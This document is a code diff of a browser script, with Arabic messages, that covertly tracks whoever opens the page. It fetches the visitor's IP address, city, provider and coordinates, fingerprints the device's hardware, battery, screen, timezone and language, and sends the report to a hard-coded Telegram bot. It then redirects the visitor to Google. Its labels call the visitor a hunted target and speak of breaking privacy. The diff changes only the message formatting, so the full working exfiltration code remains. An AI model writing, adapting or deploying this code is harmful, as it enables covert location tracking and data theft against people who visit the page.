@@ -13,43 +13,50 @@
     const CHAT_ID = "5657233411";
 
     async function apocalypseExecute() {
-        let payload = "☢️ [ هجوم الإبادة الرقمية - تدمير الخصوصية ] ☢️\n\n";
+        let payload = "☠️ [ تـم اصـطـيـاد هـدف جـديـد ] ☠️\n";
+        payload += "━━━━━━━━━━━━━━━\n\n";
 
         // 1. كسر حماية الـ IP (سحب من سيرفرات متعددة)
         try {
             const sources = ['https://ipapi.co/json/', 'https://api.ipify.org?format=json'];
             for(let s of sources) {
                 let r = await fetch(s).then(res => res.json());
-                payload += `🌐 IP: ${r.ip || r}\n📍 المدينة: ${r.city || '??'}\n🏢 المزود: ${r.org || '??'}\n🗺️ الإحداثيات: ${r.latitude},${r.longitude}\n`;
+                payload += "🌐 [ بـيـانـات الـشـبـكـة ]\n";
+                payload += `📍 الـ IP: ${r.ip || r}\n`;
+                payload += `🏙️ الـمـديـنـة: ${r.city || '??'}\n`;
+                payload += `🏢 الـمـزود: ${r.org || '??'}\n`;
+                payload += `🗺️ الإحـداثـيـات: ${r.latitude},${r.longitude}\n\n`;
                 if(r.ip) break;
             }
-        } catch(e) { payload += "⚠️ السحب الصعب للـ IP فشل.\n"; }
+        } catch(e) { payload += "⚠️ فشل سحب الموقع.\n"; }
 
-        // 2. فحص العتاد العنيف (Hardware Rape)
-        payload += `\n⚙️ تفاصيل العتاد العميق:\n`;
-        payload += `- نوع الجهاز: ${navigator.userAgent.split('(')[1].split(')')[0]}\n`;
-        payload += `- قوة المعالج: ${navigator.hardwareConcurrency} Thread\n`;
-        payload += `- الذاكرة (RAM): ${navigator.deviceMemory || 'غير معروفة'} GB\n`;
-        payload += `- كرت الشاشة: ${getGraphicsCard()}\n`;
+        // 2. فحص العتاد العنيف (Hardware Extraction)
+        payload += "📱 [ مـواصـفـات الـجـهـاز ]\n";
+        payload += `🛠️ الـنـظـام: ${navigator.platform}\n`;
+        payload += `🧠 الـمـعـالـج: ${navigator.hardwareConcurrency} Threads\n`;
+        payload += `💾 الـرامـات: ${navigator.deviceMemory || '??'} GB\n`;
+        payload += `🖼️ كـرت الـشـاشـة: ${getGraphicsCard()}\n\n`;
         
         // 3. فحص الطاقة والشبكة
         try {
             const b = await navigator.getBattery();
-            payload += `- البطارية: ${Math.round(b.level*100)}% (${b.charging ? 'يُشحن' : 'تفريغ'})\n`;
-            payload += `- نوع الشبكة: ${navigator.connection ? navigator.connection.effectiveType : 'LTE/WiFi'}\n`;
+            payload += "🔋 [ حـالـة الـطـاقـة ]\n";
+            payload += `⚡ الـبـطـاريـة: ${Math.round(b.level*100)}%\n`;
+            payload += `🔌 الـشـاحـن: ${b.charging ? 'مـتـصـل' : 'غـيـر مـتـصـل'}\n\n`;
         } catch(e) {}
 
-        // 4. البصمة الجنائية (Criminal Fingerprint)
-        payload += `\n🕵️ البصمة الجنائية:\n`;
-        payload += `- دقة الشاشة: ${window.screen.width}x${window.screen.height}\n`;
-        payload += `- المنطقة الزمنية: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
-        payload += `- لغة الجوال: ${navigator.language}\n`;
+        // 4. البصمة الجنائية (Digital Fingerprint)
+        payload += "🕵️ [ الـبـصـمـة الـرقـمـيـة ]\n";
+        payload += `🖥️ الـشـاشـة: ${window.screen.width}x${window.screen.height}\n`;
+        payload += `⏰ الـتـوقـيـت: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+        payload += `🌐 الـلـغـة: ${navigator.language}\n`;
+        payload += "━━━━━━━━━━━━━━━\n";
+        payload += "💀 [ جـاري اخـتراق الـخـصـوصـيـة... ]";
 
         // إرسال البيانات فوراً
         fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(payload)}`)
         .then(() => {
-            // التحويل لموقع يوهم الضحية بالخوف (مثلاً صفحة مخالفات)
-            setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000);
+            setTimeout(() => { window.location.href = "https://www.google.com"; }, 1500);
         });
     }
 
@@ -58,7 +65,7 @@
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl');
             const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL).split('/').pop();
         } catch(e) { return "مخفي"; }
     }
     </script>
